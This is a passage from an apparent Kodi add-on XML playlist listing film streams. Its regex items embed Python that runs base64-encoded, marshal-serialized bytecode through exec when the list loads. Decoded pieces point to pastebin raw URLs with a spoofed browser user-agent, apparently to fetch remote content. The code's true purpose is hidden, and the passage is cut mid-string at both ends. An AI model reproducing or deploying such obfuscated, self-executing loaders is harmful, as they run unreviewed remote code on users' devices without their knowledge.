Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
import xbmc,xbmcaddon,xbmcgui,re,json
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/EGr6YTm.jpg</thumbnail>
<fanart>https://3.bp.blogspot.com/-BwSmYmb5nTE/WzEm9R2JmQI/AAAAAAAAHt4/9QSuAKUdZjQXuJ221alO-silPWB_1olOwCLcBGAs/s1600/fanaaa.jpg</fanart>
</item>







<!--
<item>
<title>[COLOR gold]* [COLOR lightsalmon]Supercine [COLOR white]Estrenos[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[id3]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFJ4SUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGT2JVMHlXWHBqTWsxNlVYcE5SRmsxVFhwWmVrNVVWVFJPZWswd1RXcE5OVTVVU1hwUFJGSnBUbnBWTUUxVVNtMU9WRmt5V1ZSWk1FNTZUVEZQVkZsNlRrZEZNRTVxVFRST2VtdDZUMFJSTUUxNlFUQk5WRkpwVGtSbk1sbHFVbXBPYlZreFdWUmFhVTVIVFRKWmVtTjNUa1JyZWs5VVVUVk9lbGt3V2tSYWFrNUVZekZPZWxWNVRtMVpNbGxxVlhwT2VrVXhUa1JWTlU1NldUSlphbU41VFhwamVWcHFXbXhPUkVrd1dWUk5lazVYUlRCTmVtTTFUWHBSTUU1NlRUUk9Na1V3VFZSYWJVNUVZekJPVkdNMVRrZEpNRTVVVlRKTmVtdDZUMFJLYVUxNlRUQlphbGsxVFcxWk0wNVVVbTFOZWsxNlRrUk5NMDVVWTNwT1JGa3lUbFJSZWs5VVNtbE5iVmw1V1dwTmVFMTZSWGxaYWxWM1RsUmpNVTlFU20xTmJWa3lXVlJTYkU1VVRUSk9SRTE0VG1wWk1rNXFTbTFPYlZWNlRWUmFhazE2VFRGTlJGa3dUWHBOTUZwcVRUQk9hbGt6VG1wTk0wMTZRVEpPVkVwdFRtMVZlazVVVFRST2JWRXpUbXBOZWs1dFRUQmFWRTB5VFhwUk1scHFTbTFPZWxsNlRucGplVTVIVFhsYWFsVTBUbnBSZWsxNlkzbE9lbU15VG1wak1VMTZZM2xhYWtwdFRYcHJNMDVFV1RKT2Fsa3lUbXBqTWs1cVZUQlBSR00wVG1wVk1VNTZUWGhPVkdjeVdsUk5lazV0VVhwT2VtTjVUbXBKTTA5VVRYcE9WR013VFdwak1VNVVTVEpOYWxreVRsUk5NMDVFU20xT1IxVXdXbFJLYlU1SFZUQk5lbFV6VGxSWk0wNUVWWGhOZWtFelRXcEtiVTU2V1RCT2FsWm9UWHBOTUU1NlVteE9WRkV5V1hwYWJFNTZVVEpaVkZFMFRtMVJNazFVV1hoT2FsVXdUbnBOZWs1Nlp6Sk9SRkp0VG5wSk1rNVVaR2hPYlZVeVdWUlZNMDVxU1hwT1JGbDRUWHBuTVUxNlZURk9Na1Y2VGxSWk1FMXRTVE5QUkdONVRYcE5NbHBVVVRKTmVtdDZUMFJqTlUxNlVUQmFWRkpzVG0xRk0xbFVUVFJPVkdNeVdtcFJNMDV0UlhwT1JGSnRUWHBqZWsxVVZUVk9lbEV3VFdwVmQwNVVRVE5PYWxreVRrUk5NbHBFVW0xT1ZGa3pUMFJqTVUxdFNUTk5hbU42VGxSUk1GbFVWVFJOZWtVeVRucFdhRTF0V1RKYVJGWm9Ua1JqTUZwVVdUUk9WRTB3VDBSUk5FNTZhekJhUkdSb1RsUk5NazFxVVhwTmVsVXdUMFJOZWsxNlJUSlBWRlV5VG1wVk1GcFVWbWhOZWxFeVdWUmFhVTVFWTNwUFZHTjRUbTFWZWsxRVl6Qk9lbEY2VG1wU2FFNUVTVEpaVkdONFRtcFJNVTFxWTNkT2VrRXdUbnBOZVU1SFNUTk5WRkpzVG5wbk1VNXFXWHBPYWtreFRtcFplRTV0VVRKT1JHTjVUa2RSTTAxNlRYcE9la2w2VFZSWmVVNXFZek5QUkUxNFRucG5NazFxV1RGT1IwMHhUbXBOTlU1VVozbFphazB6VGtSVk1rNVVUVEpOZWtFd1RrUlZkMDE2UlhsWmFsVXlUbFJyTWsxVVVtbE9lazE2VFVSU2EwMTZhekpOYW1OM1RsUkpNbGw2U20xT1ZGbDZUV3BaZVU1cWEzcE5hazB4VGtSck1FMXFaR2hOZW1jeFRXcE5NMDVIVlhwT1ZGSm9UbXBuTWs5RVZUUk5lbEV4VFhwa2FFNUhSVEZOUkZwb1RrUkplazU2WXpST1IxRXlUbXBOZVU1NlRUTk5hbEpzVFhwck1GcFVWVE5PVkd0NlRrUlZlVTR5UlRKT2FsVTBUa2RKTWs1cVZYcE9SR3N3VFdwTk5VNTZhekpaZWxGNlRtcEpNVTU2V210T2FsRXdUMVJSZWsxNlRYbFphbFV4VGtSamVWcHFVbXRPVkZFeVdYcGplRTU2UlROWlZGRXpUbTFOTVUxcVZUSk9la0V6VFhwamVrMTZWVEJOVkZFMVRucG5NMDFFVlROT2FrVXlUVlJWTTA1VVNUQlpWR041VFcxSk0wNXFZM2xPYWxrelRucFpOVTU2WjNwT1JFMTVUbFJKTTAxRVRYaE9SMFY2VDFSa2FFMTZXWHBOZWxKc1RrUm5NRTVFVW1sT1IxVXlUWHBqTWs0eVJYbFphbEV3VG5wSmVrNTZZelJPYWxVeldWUlplRTU2VFRGUFJGRjRUbTFOZWs1VVRURk9WRVV6V1ZSTmQwNTZaM3BQVkZVeFRtMVpNazE2VlhwT2Fra3lXbXBhYUU1cVVUSmFSRkY0VFhwck1VNVVVbXhPYWxVelQwUmpkMDVVUlRKTmFsa3dUa1JSTWsxNlpHaE9hbEV4VDBSTk1rMTZXVEJPZWxab1RsUkZlVmxxWXpWT2Vsa3pUMVJqTlU1VVRUSlBWRkV5VFcxWk1GbHFXVFJOZW1zeFQxUlpORTE2VFRCYWFsSnBUbXBaTWxsNlZUUk9ha2w2VFVSUmVFNXFXWHBOUkZwcVRrZEZlazVVVW10T1ZHTXlUWHBhYlUxNlZUSk5WRkV6VG0xTmVrNVVTbWxPZWxsNlRWUlpNRTVxWXpOTlJFMHdUbnBOTTA1NldUQk5lbWN3VDFSWk1rNTZSVEJPVkZFd1RYcEJNRnBFVlRWTmJVbDZUMFJSTTA1dFRUTk9SR00wVG0xVk1VNXFXWGhOZWxrd1dXcGpNRTVVVlhwT1JGVjNUbnBqTUUxNldUQk9SR2N6V1ZSak1VNXRVWHBPYWsxNlRsUk5NMDU2V20xT1JFbDVXV3BqZUU1RVozbGFhazAwVG5wWk0wMTZVVFJPTWtVd1RXcFJNazV0VFRKYWFsRXlUVzFaTVU1NldUSk9lbGt5VDFSamQwNTZVVE5PYWxFeFRrZFJlazE2V1RST2JWbDZUWHBaTWsxNlp6SmFWRkUxVFhwRk1sbHFXbTFOYlZsNlRrUlZlRTV0VlROT2FscHFUa1JaTTA1VVdUUk9WMFY2VFVSU2FFNUVXVEZPYWswd1RrUlJNMDU2VVhsT1ZFRXhUV3BWTkU1VVJUTk5lazB3VGtSRk1rMTZXbWxPUjAweVRsUlNiVTVIUlROTmFtTXhUa2RWTUZsVVl6Vk9SMUV6VFdwUk5VMTZUVEJhUkUxNFRXMUpNbGw2V20xTmVra3hUV3BhYUU1VVFUTk5WRlYzVGtSTmVWbHFUVEZPYlVVeVdsUlJOVTVVV1ROT2VrMTVUbFJGTTA1cVl6Vk9SRkV4VGxSVk0wNVVSWHBOVkZsNFRsUk5lazE2VFRSTmVrRXlXbXBqZVU1cVNUTlpWRkY2VGtkVmVrOVVXVFZPZWxFeVdrUlJNMDVIVVhwUFZFcHBUa1JyTUZwRVNtbE9WRWt5V21wYWJFNTZXVE5PZWxab1RtMVZlazFFVFhoT2JVMHlUV3BWTTA1VVJUTlpWRTB6VGxSck1FOUVXVEpPVkVrelRWUlZNMDE2UlRKT2FtTjVUbFJWZVZwcVVYbE9WRVV6VG5wamVFMXRXVEZOZW1NelRucEJNVTVFWXpOT2FtZDZUVlJWTkU1NlJYcE9SR00wVGpKRk1scHFWWGROZWxFeFQwUkthVTU2V1hsYWFsbDVUbTFOTUZscVdYcE5lbFY2VFZSWmVFNXFVWHBQVkZrMVRrUkpNbGxVVFRKT2FtY3lUa1JOTTA1Nlp6Qk9SRlY1VFhwTk1scEVUVEpPYWxVeFRsUlJlVTVIV1RCUFZFMHlUa2RWZWs5VVdYaE9iVWt5V2xSS2JVNXFZekpPVkdNelRtcEplazFxVVRCT2JWRXlXbXBqZUU1VVNUSk9hbEUxVGtkWk1FOVVWWGROZW1jeVdXcFJNRTU2VFhsYWFsVjRUWHByZWs5RVRUQk9la0Y2VDBSUmVFMTZWWHBOUkZKc1RYcG5NVTlVV214TmVsa3lXa1JWTkU1dFRURk5hbFV5VG1wWk1sbDZVVEJOZWtVeFRYcFZlVTVFUlRCUFJGcHBUbFJaTUU5RVl6Qk9hbWN3V1hwTmVFNXRWVEZOZWxVd1RqSkZNRnBxVFRSTmVsRjZUVlJhYWs1RVkzcFBSRkV3VGxSQk1VOVVXWHBPYWtreFRrUlNhRTVFWjNsWmFtTXpUa1JGTVU5RVRUSk9WRUY1V21wYWFrNXFXVEZOVkZreVRucHJNRTlVVVRGTmVsRXpUbnBSZVU1NlNUTk5WRkY2VGpKRmVrNVVWWGxPUjBreFRVUk5ORTVFVlRKYVZHTXpUVzFKZWs5RVRUQk5lbU16VDFSYWJVNTZRWGxhYWswelRsUmplazlFVVRST2Vsa3hUMVJSZVUxdFdUSk5WRkUwVG1wWk0wMXFVVEZPUjFsNVdXcEthVTVFVFhwTmVsRXpUWHByTWxwcVdYbE9lbGt6VFVSUk1FNUVTVEZQUkdSb1RrZEpNMDE2V1ROTmVrbDVXV3BhYkU1VVFYcFBSRTB6VGxkRmVrOVVVbWhPVkVsNVdtcGFiRTVxVVRCWlZHTXlUa2RGTWs1cVRYbE9SMVY2VDFSYWJVNVVhek5PUkZKc1RucEpNRTFxV21wT1JFa3hUMFJOTkU1RVl6RlBSRXBwVG0xUk1FNTZXVEZPZWtFeVRucGthRTV0UlRKYVZGRjRUbXBWZWs1NlVYbE5iVWt3VFdwU2JFMTZhekphYWxwcVRYcEJNMDVVV1RWT2JWVXlUMVJSZUUxdFNUQmFWRTAxVG0xWk1rMXFXVEpPVkdzd1RrUk5lazV0V1hwTlJGVjZUWHBaTWxscVZUUk5la2w2VDFSUmVFNUVaek5aVkZFeVRsUlZNVmxVWkdoT2VrbDZUMFJLYlU1dFdUTlBWRlUxVG1wak1VMUVUVEJOZWtreVdXcFJlRTVVVlhsWmFsSnJUbFJqZWs1RVZtaE9SMDE2VDFSVmQwNVVVVEZPYWxreVRsUkZNRnBFVFRKT1JFVXlXa1JLYVU1RVJUSlpWRTAxVFhwQk0wNTZXWGxPUjFVd1RtcFpNVTVxVlRKWmFrMHpUbXBWTVUxNlZUTk9WRmt4VDBSVmQwNUVTVEpaVkdNelRYcEpNVmxVV1hwT1ZHc3pUVlJOZVU1SFZUSk5lbVJvVGtkTmVrNXFVWHBPYWxsNlRVUlNhRTF0V1RCTlZGcG9UbFJGTWs1NlZtaE5lbFV3V1hwS2FVNUVVWHBOZW1Nd1RsZEZlazlFVVRGTmJWa3hUbFJLYlU1dFdUSlpla3B0VGtkVk0wMUVVWHBOZWswd1RtcGFhMDVVV1RKYWFsa3lUbnByTUUxVVdUSk9SRmt3V1dwS2JVMTZVVEJQVkZwcVRYcFZNRTFxV1RKT2VrVXlXbFJSTUU1NlZUSmFSRlUwVG0xSk1FMVVWWGROZW1jd1QxUk5NMDE2VVRKWmVrMHdUbnBuTVZsVVl6Uk9lazB5V2tSU2FVNXFUVEJaYWxsNVRucFJNRTFVVlRST2VtdDZUbXBaTWs1VVl6QmFhazAwVG5wcmVrNTZUWGRPUkZFeFRVUlNhVTVxV1RGT2VsWm9UbnBaZVZscVVtdE9hazB6VG1wU2FVNTZVWHBQUkZGNFRYcGplazE2VVhwTmVtTjZUV3BqZWs1cVNUSk9WR042VG1wUmVrNVVUVFZPVkdzeVRXcEthVTVFVFROT2FrcHBUa1JSTTA1cVVYcE9WR2Q2VGxSVmVVNUVXVE5QUkZab1RrUmplazVVWXpWT1IxVXdUMFJTYTA1SFRYcFBSRkpyVGtkRmVrNTZXVE5PZWtFelQxUmplVTF0U1RGT1JGSnJUbFJWZWsxNlNtMU9WR3N4VGtSS2FVMTZWVEphUkZKb1RsUm5NRTU2Vm1oT2FrMTZUMFJaTWs1NlkzcE5ha3B0VFhwUk0wNXFZekZPUjBreVRtcGFhazVxV1RCT1JGVXdUbnBaTWs1NldUQk9SMUV5VFhwVmVrMTZaekphYWxrMVRucFplVnBxWXpOT2JWVXlXbFJOZDA1cVNYcE5hbHByVGxSSk1GcFVZelJOYlZsNlQwUlZOVTU2VVhwTmVsSnRUbnBuTWxsVVdtdE9WRWt5VDFSYWFVMTZaekpaZWxGNFRXMVpNVTVxVlRGT2VtTXlXa1JOTTAxNlFURlBWRXBwVGxkRk1VNUVUVEpPUkVVeVRtcE5NVTVVVlROTlZGSnJUWHByTVU1cVVtaE5lbGw2VFVSWmVFNUVSVE5PYWxwclRrZEpNRTU2V21sT2VrVXlUbXBOZDA1dFNUQk9ha3B0VGtSVk1scFVVWHBPTWtWNlRYcE5lazV0VVRGTlZFMDFUbXBqTUZwVVdUSk9SMGt5VDBSTk5FNXFhekJQUkZrelRsZEZNbGxxVlRGTmVtY3pUWHBLYVU1dFJUTlpWRmsxVGtSSk1FOUVUVEpPUkVVeVRtcE5kMDF0U1hwT2FsVjRUakpGZWs1cVVYaE9SR2N5V2xSUmVFNVVZM3BPUkdNMVRucEZNbGxVVFhwTmVsVXpUV3BaTTA1RVkzbGFhbEV4VGtSTk1rNVVUVE5PZWxWNlRXcGpOVTV0U1RKT1ZGcHBUa2RSZVZwcVdteE9SR3N3VFdwak1rMTZVVEZPUkdONFRXMVpNMDU2VVRCT1ZFRjZUa1JXYUUxdFNUQlphbU14VGxScmVWcHFWVFJPYWxFeVdrUldhRTVxVlRGTlZHTjNUWHBKTVU5RVVYcE9lbFV5VGxSUmVrNTZWVEZaVkZwcVRYcEpNRTVVVFhwT2JVMHpUa1JWTUU1VVFUSlphbHB0VG5wSmVrNVVXVE5PUkVsNlQwUlZOVTVIVlRKT1JGVXlUbXBuTUUxcVdYbE9lbFY2VG1wWk5FNXRWVE5OVkZFd1RsUm5lazlFV20xT1ZFVjZUa1JWZVUxdFdYcE9hazE0VG5wck1FMTZXVEJOZW1zeVdrUk5lazV0U1RGT2Vsa3lUbXBqTUUxNlRUVk9hbU14VDBSTk5VNVVVVEJaYW1NeVRXMVpNRTVFV1RGT2FtY3lUa1JOTkU1dFRYcE5SRnB0VGxSamVWbHFZekpPYlUwd1RWUkthVTV0UlRKT2VsRTBUWHByTWs1NlVURk5lbXN5V1hwVk0wMXRTVEpQUkdNMVRYcFZNRmw2VFhsT1Iwa3dUMFJWTUU1VVl6Qk5WRXBwVGxkRk1FOUVUVEZPYlVreVdsUk5NRTVFVFRKTmVrcHBUa1JKZVZwcVVUVk9hbU41V21wS2FVNXFaekJQUkUwMFRtcFJNRTVVVFhsTmVsVXpUMFJOZDA1NlNURlpWRnBwVGtSbk1scEVVbTFPYWtWNlRtcFpNazU2V1RGT2VsRXhUbXBWZWs1NlRYZE9WRVY2VDFSWmVrNXRUVEZOYWxreVRtMVZNMDFxVVRGT2Vsa3hUMVJWZDA1NmF6QlphbGt5VG1wTk1rOUVTbTFPYlVVd1RtcE5lazV0VVRCUFJFcHRUbTFOTVUxRVdUTk9SRTB4VFdwTk5FNTZVVEZPYWxab1RYcFJNMDlVVW1sT2FrMHlUbFJaZUUxdFNURk9hbVJvVG0xTk1GcEVXVEJPUjBVd1RWUk5lazV0U1ROUFJHUm9UbGRGTVUxcVdUQk9WRmt3V1ZSTk1rNXFSWHBQUkZVd1RucEJlVnBxV1ROTmJWa3lXbFJhYlUxNlJYcE5WRlV3VGpKRk1VOVVXbWxPTWtVeFRWUldhRTVxV1hwT2FsazBUbFJSTUZsVVdUSk9WRTB3V1hwWk1VNTZRVEJOZWxwcVRucHJNazlFVFRWT2FtTXlUbXBOTkU1VVRUQk5hbU0wVGxSUk1rOVVXbXRPUkdjeldWUlJNRTF0V1RCYVJGbDZUbXBKTTA1RVkzbE9Na1V6VFdwUk5VNXFWVEpQVkZGNVRtMVZNbGxxVFRGTmVtY3pUMFJaTWsxNlNURk5WRmw0VFcxWk1FMXFWVFJOZWtFd1RucFJkRWNTQUFBMFducFdiVnBSUlhoYWVsWXlRa2ROZUVGdGNERk1SMDE1UVcxNE1rMTNTRFZhYlhBeFFXMU5kVUZSVWpCTlIwMTNRWGRFTTBGdGNEQkJiWFF4V2tkd01rRnRVak5hVVVocVducE1Na3gzUkRCYWJVUnRXbmRNTkVGNlZqRkNVVWd6UVZGSWJFeDNjRFJCTWxJeVFYZElNVUZ0VmpGQ1VVZ3pRVzFTYlZwSFRYVkJVWEF4UVcxSmRVRjNlREpOZDB3eFFWUmFNVnBSY0d4YWJWb3dXbmROZVVGVVZqTmFVVXd5UVZSV00wRlJSREJCTWxJelFsRk1NVUY2V2pGQ1VWZDJRWGRTTUV4SFJERkJla2d3UVhkSWFrRkhUak5hYlhCc1FWUklNVUYzV2pGYWJWWXlRbEZNTWxwNlREQkJVVm8wUVhwU01FSlJUWGhCVVhneVFWRk1NRUYzUkRGYVIwVjZRWGRhTWsxUlREVmFiWEF4UVhkTmVVRkhkREphUjBWNVdtMTRNMXB0Y0d4QmJVZ3dUSGRNYlVGM1JESmFSMFY1UVhwRU1FRlJUR3RCZDFKdFFrZEZlRnB0VW0xYWJVMTNRWHBNYlVKSFNHeEJla1JzVFhkSmRVRnRVak5DVVV3eVFXMUlNVUZSY0d0QlVYUXdUSGROZVVGM2VESk1SM0F3UVVkd01FeDNUREpCYlZvd1FYZGFORUZ0VERKYVIwbDFRWGRJYlVGM1NERmFla3d3VFZGYU1VRnRlREZDVVUxMVFWRk1Na0YzV2pKQlVYQnNUWGRGZGtFeVVqTkNSMFExUVhkTWJWcDNURzFCZDB3eVRHMU1NVUZIUkROTVIwMTVRWGRJTTBGSFRYcGFiVkpzVFhkRmVWcHRUREZCZDFvMFFXMVdNMEpSY0dwQlZFd3dRWGRNTUVGSFdqSk5kMFEwUVZSRU1rMUhXalZCVVVodFdrZEViVUZ0VEcxQ1Iwd3lRVzFTTWsxM1JEUkJlbFl6UWxGWGRrRnRlRzFhYlV3MVFWRkViRTEzVFhwQlIzUnRRWGROZVVGVVZqSk5VVmQyUVcxNE1VSlJURE5hZWt3eFFWRk1NVUZ0U0RKYVIxcHFRVzE0TWt4dFJHeGFiVkl3UVVkYU0wRlJjRE5hYlZkMlFYZHdNMHhIUlhkQmJVNHlRbEZYZGtGNlREQk5kMFF4UVZSSWJFeDNTR3RCZWxwdFdrZEVNVUYzVEcxYWQwUnRRVzFPTWtGM1JEVmFiVkp0V20xYU1VRlJVbXhOZDBnMVFWUk1NRUYzUlhsQmJYUXdRWGRhYWxwdFVteE1kMDExUVVkT01reEhSRFZCZWxZeFdrZFhka0YzZERGTVIxb3pRVWR3TVZwUlRERkJSM0J0UVcxRmVVRkhUakJOZDFwclFWRmFNVUZSY0RKQlNsSXdRWGRJYlVGdFVteE5kMHd6UVcxU2JVRnRTR3hCZDNReFFWRlhka0ZIZURCYWQzQXlRVzFJTVZwUmNHcGFiVVF5VFVkYWEwRjZWbXhOZDB4clFYZFdNbHB0VFhoYWJYUXlRWGRJTVVGNlNETk1SMFJyUVVkT01WcHRXalJCUjNnd1FVZGFNMEZSZERCTWQweHJXbnBNTUUxUlRHdGFiVkl3UVcxSU1VRlVUREJCVVhCdFFYZDRiVUpIY0RCQlIwZ3dURzFGZFVGNlJERmFSMHd3V25wTU1scHRTREJhYlhCdFdtMUVhMEV5VW0xQmQwbDFXbnBXTVZwM2NHMUJSM1F5UWxGRmVrRlVUREZCUjBneVducFdNMEZIU0ROQlZGSXpRWGR3TWtGNlNHMUJiWEJzV20xd2JVSkhXalJhYlZvd1RWRlhla0ZIZEcxQ1VWbzBRWGRNTUZwSGNHcEJkM1F3UVhkWGRscDZWak5hUjBRMFFYcGFiVUZ0Y0RGYWJVZ3hRVkZ3TVVGVVdtMWFkM0EwUVhkNE1FRnRTRzFCUjNSdFdrZFhka0YzZURCYVIwUTBRWHBNYlZwM1JETkJiVTR6UWtkRU5FRjNXakJCUjBRMFducFdNMEpSY0RCQmVrZ3dXa2RNYkVGUlNHeE5kM0EwUVcxV01FSkhUWGhCYlU0eVRWRndNMEZ0UkcxYWJYQTFRWHBFTTBKSFRYbEJiVkl4UVcxRU1scDZWbTFCVVV4c1FVZGFNa0YzY0d0QlIzUXlRbEZNTVVGdFNESkJkMFExUVhwU01rMTNTR3RCYlhBelFWRk1NRnA2VEROQlVWb3pRWHBNTWtGSFNHeEJSMFF4UVcxSU5VRjNjRE5NUjBWNVFVZE9NRXhIUlhaQlVVUXlRVWRFTUVGSFJHMUJVVVYzUVVwU00wSkhSWGRYYWpCWWNWVlhZMjk2ZVRCeVJrNDVWbEJ4YkhGVVRXaGFNM2xrUWxSeFlVeGhUV2h1VW1zeVRYcFRNMFI0Y1VaRmQwbEhUVEF3WlhGR09WRmFSamxMU1ZOVGEwMVZjWFZ2TWxNd1JVaHFNa0Y1Z